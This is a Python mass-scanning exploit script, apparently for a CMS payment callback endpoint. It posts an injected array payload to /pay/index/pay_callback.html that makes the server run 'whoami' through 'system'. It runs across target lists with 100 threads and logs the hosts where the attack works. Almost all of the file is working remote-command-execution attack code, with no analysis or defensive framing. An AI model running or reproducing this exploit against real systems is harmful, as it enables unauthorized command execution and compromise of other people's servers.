import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """

███████╗███╗   ███╗ ██████╗███╗   ███╗███████╗██████╗  ██████╗███████╗
╚══███╔╝████╗ ████║██╔════╝████╗ ████║██╔════╝██╔══██╗██╔════╝██╔════╝
  ███╔╝ ██╔████╔██║██║     ██╔████╔██║███████╗██████╔╝██║     █████╗  
 ███╔╝  ██║╚██╔╝██║██║     ██║╚██╔╝██║╚════██║██╔══██╗██║     ██╔══╝  
███████╗██║ ╚═╝ ██║╚██████╗██║ ╚═╝ ██║███████║██║  ██║╚██████╗███████╗
╚══════╝╚═╝     ╚═╝ ╚═════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝                                                                      
                                                                                                                                          
                                                        version: 1.0
"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description='QLBSQL! ')
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    #判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        #多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = "/pay/index/pay_callback.html"
    url = target+payload_url
    headers={
        'User-Agent': 'Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = 'out_trade_no[0]=eq&out_trade_no[1]=whoami&out_trade_no[2]=system'
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=10)
        if res.status_code == 200 and 'administrator' in res.text :
            print(f"[+]该url存在漏洞{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
                        return True
        else:
            print(f"[-]该url不存在漏洞{target}")
    except :
        print(f"[*]该url存在问题{target}")
        return False

if __name__ == '__main__':
    main()